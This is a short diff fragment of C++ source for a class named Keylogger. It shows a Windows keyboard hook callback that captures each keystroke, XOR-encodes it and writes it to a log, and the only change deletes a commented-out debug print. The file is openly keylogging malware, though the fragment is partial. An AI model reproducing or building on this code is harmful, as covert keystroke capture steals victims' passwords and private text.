@@ -50,7 +50,6 @@ LRESULT CALLBACK Keylogger::KBHook(int code, WPARAM wParam, LPARAM lParam) {
             DWORD vkCode = pKeyStruct->vkCode;
             wchar_t* character = vk2ascii(vkCode);
             if (character != nullptr) {
-                // std::cout << "Before XOR: " << static_cast<char>(*character) << std::endl; 
                 XOR(character, lstrlenW(character), key, lstrlenW(key));
                 kblog << static_cast<char>(*character) << std::endl;
             }
